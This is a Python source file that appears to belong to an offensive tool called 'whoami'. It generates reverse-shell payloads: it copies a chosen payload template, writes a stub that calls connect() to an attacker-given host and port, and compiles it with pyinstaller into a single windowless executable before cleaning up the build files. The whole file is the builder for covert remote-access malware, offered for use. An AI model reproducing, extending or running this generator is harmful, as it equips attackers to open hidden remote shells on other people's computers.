import os
import platform
import shutil

RED = '\033[91m'
GREEN = '\33[92m'
END = '\033[0m'

try:
    import pathlib
    
except:
    print(f"\n{RED}[!]{END} Failed To Import Packeges Try To Install It Manually Using The Following Command 'pip install -r requirements.txt'.")
    exit()

def show_payloads():
    payloads = pathlib.Path("whoami_payloads").glob("*.py")
    
    for file in payloads:
        print(f'\n{GREEN}[+]{END} {file}')
        
def check_payload(payload):
    if os.path.isfile(f"{payload}"):
        return True
    else:
        return False

def machine_os():
    try:
        machine_os = platform.system()
        return machine_os

    except Exception as e:
        return(f"\n{RED}[!]{END} Failed To Get The Machine Os.")

def clean(payload ,payload_name):
    try:
        shutil.rmtree("whoami_output/tempfolder")
        os.remove(f"whoami_output/{payload}")
        os.remove(f"whoami_output/{payload_name}.py")
        print(f"\n{GREEN}[+]{END} Cleaning Completed Succefully.")
    
    except Exception as clean_error:
        print(f"\n{RED}[!]{END} Failed To Clean clear {clean_error}.")

def create_payload(payload, payload_name, payload_host, payload_port):
    match = [f for f in os.listdir("whoami_output/") if any([f == payload_name, f.startswith(payload_name + ".")])]

    if match:
        match = match[0]
        print(f"\n{RED}[!]{END} There Is A Payload With This Name Please Change The Name.")

    else:
        shutil.copyfile(payload, "whoami_output/whoami_reverse_shell.py")

        if machine_os() == "Windows":
            payload = payload.split("\\")[1]

        else:
            payload = payload.split("/")[1]

        shutil.copyfile(f"whoami_payloads/{payload}", f"whoami_output/{payload}")
        
        try:
            with open(f"whoami_output/{payload_name}.py", "w") as file:
                file.write(f"from {payload.split('.py')[0]} import connect\n")
                file.write(f"connect('{payload_host}', {payload_port})")

            os.system(f"pyinstaller --distpath whoami_output --workpath whoami_output/tempfolder --specpath whoami_output/tempfolder --onefile --noconsole whoami_output/{payload_name}.py")
            print(f"\n{GREEN}[+]{END} Payload Created Succesfully.")
            clean(payload, payload_name)

        except Exception as create_error:
            print(f"\n{RED}[!]{END} Failed To Create Whoami Payload {create_error}.")